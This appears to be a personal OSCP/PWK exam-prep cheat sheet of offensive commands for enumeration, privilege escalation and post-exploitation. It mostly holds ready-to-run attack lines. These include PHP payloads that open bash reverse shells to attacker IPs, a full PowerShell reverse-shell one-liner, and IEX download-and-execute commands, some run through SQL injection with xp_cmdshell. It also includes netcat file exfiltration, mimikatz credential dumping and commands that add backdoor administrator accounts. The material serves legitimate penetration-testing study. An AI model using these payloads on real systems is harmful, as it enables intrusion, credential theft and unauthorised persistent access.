Disclaimer: none of the below includes spoilers for the PWK labs / OSCP Exam.

Credit Info:
I have obtained a lot of this info through other Github repos, blogs, sites and more.
I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz

Active Directory & Domain Controllers
----------------
- http://web.archive.org/web/20141004091538/http://www.slaughterjames.com/blog/2012/10/23/hacking-a-domain-controller-part-1-enumeration.html

- http://web.archive.org/web/20160417135414/http://www.slaughterjames.com/blog/2012/10/30/hacking-a-domain-controller-part-2-easy-pwnage.html

BOF (WIP)
----------------
(Bad Characters: 0x00, 0x0A)
- Fuzzing
- Finding eip position
- Finding bad chars
- Locating jmp esp
- Generating payload with msfvenom
- Getting reverse shell with netcat

DNS - Zone Transfers
----------------
- host -t axfr HTB.local 10.10.10.10
- host -l HTB.local 10.10.10.10
- host -l <domain name> <name server>
- dig @<dns server> <domain> axfr

File Transfers
----------------
#Wget Transfer
How to retrieve file(s) from host (inside a reverse shell)

	1. Place file you want transferred in /var/www/html/
	2. # service apache2 start
	3. # wget http://10.10.10/pspy64 <- for single file
  	4. # wget -r http://10.10.10.10/pspy64/ <- for folder
	
#TFTP Transfer
(How to transfer from Kali to Windows)
Using MSF. Start MSF before starting these steps:

	1. use auxiliary/server/tftp
	2. set TFTPROOT /usr/share/mimikatz/Win32/
	3. run
  	4. tftp -i 10.10.10.10 GET mimikatz.exe

#NC (Windows to Kali)

	Windows:
	1. nc -nv 10.11.0.61 4444 < bank-account.zip
	
	Linux:
	2. nc -nlvp 4444 > bank-account.zip
	
#Powershell

	1. Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
	
#Base64

	local system:
	1. cat exploit.py |base64
	
	victim:
	2. echo "base64string==" | base64 -d >> exploit.py


LFI / RFI
----------------
- _<?phpexec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'");
- _<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
- Refer to LFI / RFI section at the top of the page ^^

MSSQL / SQLi
----------------
- EXEC master..xp_cmdshell 'whoami';
- meh' exec master..xp_cmdshell 'whoami' --
- https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md
- http://pentestmonkey.net/category/cheat-sheet/sql-injection

Password Cracking
----------------
#Hashcat
- user:$1$AbCdEf123/:16903:0:99999:7::: 
- hashcat -m 500 -a 0 -o cracked_password.txt --force MD5_hash.txt /usr/share/wordlists/rockyou.txt

#John
- user:$1$AbCdEf123/:16903:0:99999:7::: 
- john --rules --wordlist=/usr/share/wordlists/rockyou.txt MD5_hash.txt

Payload Generation
----------------
- https://netsec.ws/?p=331
- http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
- https://www.offensive-security.com/metasploit-unleashed/payloads/
- https://github.com/swisskyrepo/PayloadsAllTheThings
- non staged = netcat
- staged = multi/handler

PHP
----------------
- https://stackoverflow.com/questions/20072696/what-is-different-between-exec-shell-exec-system-and-passthru-functions?lq=1


Priv Esc - Linux
----------------
# If GCC & WGet is installed it is likely the system is vulnerable to a kernel exploit
- https://github.com/SecWiki/linux-kernel-exploits
- https://gtfobins.github.io
- https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
- https://github.com/jondonas/linux-exploit-suggester-2
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- grep -Ri 'password' .
- find / -perm –4000 2>/dev/null
- find / -user root -perm -4000 -exec ls -ldb {} \;
- which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
(then ls -la, look for 777 file permissions).

Priv Esc - Windows
----------------
 - http://www.fuzzysecurity.com/tutorials/16.html
 - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc (PowerUp)
 - https://github.com/M4ximuss/Powerless
 - https://github.com/sagishahar/lpeworkshop
 - https://github.com/411Hall/JAWS
 - https://github.com/rasta-mouse/Watson
 - https://github.com/rasta-mouse/Sherlock (Deprecated)
 - https://github.com/GDSSecurity/Windows-Exploit-Suggester
 - churrasco -d "net user /add <username> <password>"
 - churrasco -d "net localgroup administrators <username> /add"
 - churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"

Post Exploitation
----------------
1. Mimikatz.exe (run it)
2. privilege::debug
3. sekurlsa::logonpasswords

Port Scanning
----------------
#TCP
- reconnoitre -t 10.10.10.10 -o . --services --quick --hostnames
- nmap -vvv -sC -sV -p- --min-rate 2000 10.10.10.10
- nmap -sT -p 22,80,110 -A 
- nmap -p- -iL ips.txt > TCP_Ports.txt 

#UDP (can take hours so maybe netstat is a better alternative)
- nmap -sU --top-ports 10000
- nmap -sT -sU -p 22,80,110 -A 
- nmap -sT -sU -p- --min-rate 2000
- nmap -p- -sU -iL ips.txt > udp.txt 
- nmap -sU -sV -iL ips.txt > alludpports.txt 

#SNMP
nmap -p161 -sU -iL ips.txt > udp.txt  (cmd could be wrong, double check)

#SSH
nmap --script ssh2-enum-algos -iL ips.txt > SSH.txt 

#SSL
nmap -v -v  --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,sslv2 -iL ips.txt > SSLScan.txt 

Pivoting
----------------
- sshuttle -r user@10.10.10.10 10.1.1.0/24

Remote Desktop
----------------
rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/

Reverse Shells
----------------
#Linux
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://awansec.com/reverse-shell.html

#Windows
- https://github.com/Dhayalanb/windows-php-reverse-shell

Shell Upgrading
----------------
- In reverse shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

- In Kali

3. stty raw -echo
4. fg

- In reverse shell
5. reset (sometimes optional)
6. export SHELL=bash
7. export TERM=xterm-256color
8. stty rows <num> columns <cols> (optional)
```
Show listening ports
----------------
- Linux netstat syntax
	1. netstat -tulpn | grep LISTEN

- FreeBSD/MacOS X netstat syntax
	1. netstat -anp tcp | grep LISTEN
	2. netstat -anp udp | grep LISTEN
	
- OpenBSD netstat syntax

	1. netstat -na -f inet | grep LISTEN
	2. netstat -nat | grep LISTEN

- Nmap scan syntax
	1. sudo nmap -sT -O localhost
	2. sudo nmap -sU -O 192.168.2.13 ##[ list open UDP ports ]##
	3. sudo nmap -sT -O 192.168.2.13 ##[ list open TCP ports ]##

SMB - Enumeration
----------------
- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
- smbmap -H 10.10.10.10
- smbclient -L 10.0.0.146
- smbclient //10.10.10.10/share$

SMB - Impacket
----------------
- Impacket's PSEXEC (After creating a remote port fwd)
/usr/share/doc/python-impacket/examples/psexec.py user@10.10.10.10

Password: (password)

[*] Trying protocol 445/SMB...

- Impacket's SMBServer (For File Transfer)
1. cd /usr/share/windows-binaries
2. python /usr/share/doc/python-impacket/examples/smbserver.py a .
3. \\\10.10.10.10\a\mimikatz.exe

SMTP Enumeration
----------------
https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/SMTP/smtp_commands.txt

VMware (not going full screen)
----------------
- systemctl restart open-vm-tools.service

Web Scanning:
----------------
#Web Scanning with extensions

```

Linux (Example web server might be Apache)
gobuster -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401

Windows (Example web server might be IIS)

gobuster -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401

Linux (Example web server might be Apache) 

python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50

Windows (Example web server might be IIS)

python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50

```

#HTTP
- gobuster -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69
- gobuster -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69

#HTTPS
- gobuster -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69

#Nikto
- nikto -h 10.10.10.10 -p 80

#Nikto HTTPS
- nikto -h 10.10.10.10. -p 443

WFuzz
- wfuzz -u http://google.com/login.php?username=admin&password=FUZZ -w /usr/share/wordlists/rockyou.txt
- wfuzz -u http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00 -w /usr/share/wfuzz/wordlist/general/common.txt

Web Shells
----------------
- https://github.com/Arrexel/phpbash
- https://github.com/flozz/p0wny-shell

WordPress
----------------
- https://forum.top-hat-sec.com/index.php?topic=5758.0

Windows Framework / Powershell
----------------
- https://github.com/samratashok/nishang
- https://github.com/rasta-mouse/Sherlock
- Reverse Powershell: (sometimes powershell or echo may need to be infront of the string and sometimes quotes may be needed, e.g. powershell IEX or powershell "IEX..etc" or echo IEX).
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1') | powershell -noprofile -
```
```
IEX(New-object Net.WebClient).DownloadString('http://10.10.10.10:80/PowerUp.ps1')
```
- Reverse Powershell using mssql:
```
xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.10.10/Nishang-ReverseShell.ps1\")
```
Windows Post Exploitation Commands
----------------
- WMIC USERACCOUNT LIST BRIEF
- net user
- net localgroup Users
- net localgroup Administrators
- net user USERNAME NEWPASS /add
- net user "USER NAME" NEWPASS /add
- net localgroup administrators USERNAME /add
